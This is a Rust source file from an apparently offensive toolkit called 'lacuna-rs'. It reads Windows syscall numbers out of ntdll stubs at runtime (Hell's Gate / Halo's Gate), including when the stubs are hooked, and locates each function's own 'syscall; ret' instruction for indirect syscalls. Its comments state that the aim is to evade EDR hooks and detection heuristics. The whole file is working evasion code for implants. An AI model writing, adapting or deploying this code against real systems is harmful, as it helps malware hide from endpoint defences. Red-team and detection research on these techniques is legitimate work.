//
// nt.rs — SSN resolution and syscall;ret gadget location for lacuna-rs
//
// Ported from lacuna_chain.c:
//   resolve_ssn(), find_func_syscall().
//
// This is the "better syscalls-rs" layer: instead of a build-script-generated
// SSN table that goes stale across Windows builds, we read the SSN straight
// out of ntdll's stub at runtime, and we target the *function's own*
// `syscall; ret` instruction so RIP is inside ntdll at kernel entry —
// defeating the EDR "SSN mismatch" heuristic that fixed-table indirect
// syscall crates can trip.
//

#![allow(dead_code)]

use crate::pe;
use crate::win::{HMODULE, ULONG64, DWORD};

/// Sentinel returned when SSN resolution fails.
pub const SSN_INVALID: DWORD = 0xFFFF_FFFF;

/// Read the SSN from an ntdll syscall stub.
///
/// A clean (unhooked) stub looks like:
///   4C 8B D1          mov r10, rcx
///   B8 xx xx 00 00    mov eax, <SSN>
///   ...
///
/// If the stub is hooked (the `mov r10, rcx` / `mov eax, imm32` prologue is
/// missing), we scan ±10 adjacent stubs (32 bytes apart) and adjust the SSN
/// by the stub offset — the classic Hell's Gate / Halo's Gate technique.
///
/// Ported from resolve_ssn().
pub fn resolve_ssn(ntdll: HMODULE, fn_name: &[u8]) -> DWORD {
    let p = pe::export_va(ntdll, fn_name) as *const u8;
    if p.is_null() {
        return SSN_INVALID;
    }
    unsafe {
        // Clean stub?  SSN is the imm32 at offset +4 (after 4C 8B D1 B8).
        if *p == 0x4C && *p.add(1) == 0x8B && *p.add(2) == 0xD1 && *p.add(3) == 0xB8 {
            return *(p.add(4) as *const DWORD);
        }
        // Hooked — scan neighbours.
        for d in 1..=10usize {
            // p - d*32
            let u = p.offset((d * 32) as isize * -1);
            if *u == 0x4C && *u.add(1) == 0x8B && *u.add(2) == 0xD1 && *u.add(3) == 0xB8 {
                return *(u.add(4) as *const DWORD) + d as DWORD;
            }
            // p + d*32
            let dn = p.add(d * 32);
            if *dn == 0x4C && *dn.add(1) == 0x8B && *dn.add(2) == 0xD1 && *dn.add(3) == 0xB8 {
                return *(dn.add(4) as *const DWORD) - d as DWORD;
            }
        }
    }
    SSN_INVALID
}

/// Find the `syscall; ret` (`0F 05 C3`) sequence inside a specific ntdll
/// function.  Returns the absolute VA, or 0 if not found within 32 bytes
/// of the function start.
///
/// Per-function targeting: RIP lands at the function's OWN syscall
/// instruction, so the SSN matches the function name — no EDR mismatch
/// heuristic can fire.
///
/// Ported from find_func_syscall().
pub fn find_func_syscall(ntdll: HMODULE, fn_name: &[u8]) -> ULONG64 {
    let p = pe::export_va(ntdll, fn_name) as *const u8;
    if p.is_null() {
        return 0;
    }
    unsafe {
        for i in 0..32 {
            if *p.add(i) == 0x0F && *p.add(i + 1) == 0x05 && *p.add(i + 2) == 0xC3 {
                return p.add(i) as ULONG64;
            }
        }
    }
    0
}

/// Resolve both the SSN and the function's own `syscall; ret` VA in one
/// call — the pair needed by `stub::make_stub()`.
pub fn resolve(ntdll: HMODULE, fn_name: &[u8]) -> (DWORD, ULONG64) {
    (resolve_ssn(ntdll, fn_name), find_func_syscall(ntdll, fn_name))
}